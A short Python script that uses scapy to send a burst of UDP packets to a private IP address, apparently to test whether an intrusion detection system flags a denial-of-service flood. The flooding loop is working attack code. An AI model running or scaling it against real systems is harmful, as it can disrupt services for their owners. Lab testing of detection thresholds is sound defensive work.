#DOS Simulation code
#This script simulates a DoS attack by sending 1000 UDP packets to a specified IP address and port, using the scapy library to craft and send the packets.
from scapy.all import send, IP, UDP

#target_ip = "192.168.29.217"
# target_port = 80
# num_packets = 1000

def simulate_dos_attack(target_ip, target_port, num_packets):
    #print(f"Simulating DoS attack on {target_ip}:{target_port} with {num_packets} packets")
    #Uses a loop to create and send the specified number of packets to the target.
    for _ in range(num_packets):
        packet = IP(dst=target_ip) / UDP(dport=target_port)
        send(packet, verbose=0)
    #print("DoS attack simulation complete.")

#Calls to start the DoS attack simulation.
#simulate_dos_attack(target_ip, target_port, num_packets)

#call to loop
if __name__ == "__main__":
    target_ip = "172.20.10.3"  # Change to the IP your IDS is monitoring
    target_port = 80  # Commonly monitored port
    simulate_dos_attack(target_ip, target_port, 100)  # Adjust count as needed for your threshold


